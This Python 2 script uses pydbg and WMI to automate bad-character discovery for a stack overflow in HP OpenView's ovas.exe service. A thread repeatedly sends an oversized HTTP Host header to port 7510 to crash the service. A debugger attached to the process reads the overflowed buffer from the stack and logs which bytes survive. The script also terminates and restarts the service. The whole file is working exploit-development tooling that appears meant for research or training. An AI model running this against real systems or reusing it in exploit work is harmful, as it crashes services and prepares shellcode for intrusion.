
from pydbg import *
from pydbg.defines import *
import sys, time, wmi, socket, os, time, threading

allChars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13"
"\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26"
"\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39"
"\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c"
"\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72"
"\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85"
"\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98"
"\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab"
"\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe"
"\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1"
"\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4"
"\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7"
"\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

counter = -1
badChars = []
goodChars = []
goCrash = False
maxCount = len(allChars) - 1

def sendPayload(crash):
    payload = "GET /topology/home HTTP/1.1\r\n"
    payload += "Host: " + crash + ":7510\r\n"
    payload += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
    payload += "Content-Length: 4000\r\n\r\n"

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("127.0.0.1", 7510))
        s.send(payload)
        print "Should have crashed"
        return False
    except:
        print "Exception in sending buffer, service down?"
        print "Sleep before retrying..."
        time.sleep(5)
        return True

def crashService():
    """
    Application crasher. Crashes application in an independent thread. Simply sends data, no error handling.
    """

    global goCrash, counter, badChars, goodChars, allchars, maxCount, pid
    timer = 0

    while True:
        if goCrash:
            timer = 0
            counter += 1
            if counter > maxCount:
                print "Bad Characters: ", str(badChars)
                print "Good Characters: ", str(goodChars)
                sys.exit()
            print "Waiting 1 second before crashing the application"
            time.sleep(1)

            payload = "A" * 8 + allChars[counter]*92 + "B"*3900

            print "[*] Sending request for ", repr(allChars[counter])
            r = sendPayload(payload)
            if not r:
                goCrash = False
        else:
            if timer > 10:
                print "10 seconds passed and no crash? Bad character could have avoided crash"
                print "Crashing ovas making the last character as a bad one..."
                payload = "A" * 4000
                r = sendPayload("A"*4000)
                if not r:
                    goCrash = False
        time.sleep(1)
        timer += 1
    return

def restartService():
    """
    Restart service after a crash
    """
    global pid
    stop = "ovstop -c ovas"
    start = "ovstart -c ovas"
    print "Restarting service"
    os.system(stop)
    os.system(start)
    return

def findBadChars(rawData):
    """
    Compare sent buffer with buffer in memory in order to determine bad characters. Save result to good.txt and bad.txt
    """
    global goCrash, counter, badChars, goodChars, allChars
    hexData = dbg.hex_dump(rawData)

    print "Searching for ", repr(allChars[counter])
    print "In buffer ", hexData

    if rawData == "http://" + "A"*8 + allChars[counter]*92 + "B"*8:
        goodChars.append(allChars[counter])
        print repr(allChars[counter]), 'is a good character'
        print goodChars
        fp = open("good.txt", "w")
        fp.write(str(goodChars))
        fp.close()
        return
    else:
        badChars.append(allChars[counter])
        print repr(allChars[counter]), "is a bad character"
        print badChars
        fp = open("bad.txt", "w")
        fp.write(str(badChars))
        fp.close()
        return

def access_violation_handler(dbg):
    """
    Access violation handler: read data from pointer on the stack once
    ACCESS_VIOLATION has been thrown.
    """
    global goCrash, counter, badChars, goodChars, allChars
    print "Access Violation"
    print "Checking for bad characters"
    
    esp_offset = 0x1c

    raw_address = dbg.read(dbg.context.Esp + esp_offset, 0x4)
    address = dbg.flip_endian_dword(raw_address)

    buffer = dbg.read(address, 0x73)
    findBadChars(buffer)

    dbg.detach()
    return DBG_EXCEPTION_NOT_HANDLED

def findPID():
    """
    Find pid of ovas.exe
    """
    print "Searching for PID..."
    c = wmi.WMI()
    pid = 0
    for process in c.Win32_Process():
        if process.Name == "ovas.exe":
            pid = process.ProcessId
            return pid
    if not pid:
        return False

def newDebuggee(pid):
    """
    Create a debugger instance and attach to ovas PID
    """
    print "Attaching debugger to PID: %d" % pid
    dbg = pydbg()
    dbg.set_callback(EXCEPTION_ACCESS_VIOLATION, access_violation_handler)
    while True:
        try:
            if dbg.attach(pid):
                return dbg
            else:
                return False
        except:
            print "Error in attaching..."
            time.sleep(1)

if __name__ == "__main__":
    global pid
    oldpid = 0

    thread = threading.Thread(target=crashService)
    thread.setDaemon(0)
    thread.start()

    while True:
        print "Old PID:\t", oldpid
        pid = 0
        while not pid:
            pid = findPID()
            if pid == oldpid:
                c = wmi.WMI()
                for process in c.Win32_Process():
                    if process.ProcessId == pid:
                        process.Terminate()
                pid = 0
            else:
                oldpid = pid
            time.sleep(1)
        dbg = newDebuggee(pid)
        if dbg:
            goCrash = True
            dbg.run()
        else:
            print "Can't attach to process, exiting..."
            sys.exit()
        restartService()
